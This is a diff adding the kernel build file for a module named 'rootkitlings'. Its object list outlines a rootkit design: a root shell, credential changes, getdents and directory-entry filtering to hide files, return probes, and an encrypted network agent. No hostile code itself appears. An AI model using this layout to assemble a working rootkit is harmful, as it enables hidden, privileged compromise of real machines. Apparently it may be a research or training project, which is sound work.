@@ -1,0 +1,15 @@
+ROOTKITLINGS_FAIL_POINT ?= 0
+
+obj-m += rootkitlings.o
+rootkitlings-y := core/main.o core/state.o interface/proc.o \
+	execution/worker.o execution/scheduler.o execution/root_shell.o \
+	control/authorization.o privilege/credentials.o \
+	instrumentation/return_probe.o instrumentation/events.o \
+	instrumentation/dirent_filter.o instrumentation/getdents_probe.o \
+	instrumentation/replace.o interface/evidence.o \
+	network/framing.o network/ipv4.o network/protocol.o network/agent.o \
+	staging/platform.o staging/transaction.o interface/agent_status.o \
+	crypto/aead.o crypto/aead_platform.o security/clear.o \
+	security/control.o security/provision.o
+ccflags-y += -I$(src)/include
+ccflags-y += -DROOTKITLINGS_FAIL_POINT=$(ROOTKITLINGS_FAIL_POINT)
